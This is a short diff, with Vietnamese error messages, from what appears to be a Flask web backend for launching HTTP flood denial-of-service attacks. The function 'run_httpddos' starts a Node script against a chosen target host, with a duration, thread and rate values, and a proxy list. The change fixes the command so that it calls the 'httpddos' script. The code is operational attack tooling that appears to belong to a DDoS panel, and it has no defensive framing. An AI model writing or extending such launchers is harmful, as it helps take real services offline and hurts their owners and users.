@@ -142,7 +142,7 @@ def run_httpddos():
         return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500
 
     # Command: node <target> <time> 8 45 <proxy-file>
-    cmd = ["node", host, time_param, "8", "45", proxy_file]
+    cmd = ["node", "httpddos", host, time_param, "8", "45", proxy_file]
     ok, err = start_background_node(cmd)
     if not ok:
         return jsonify({"error": f"Lỗi khi chạy httpddos: {err}"}), 500
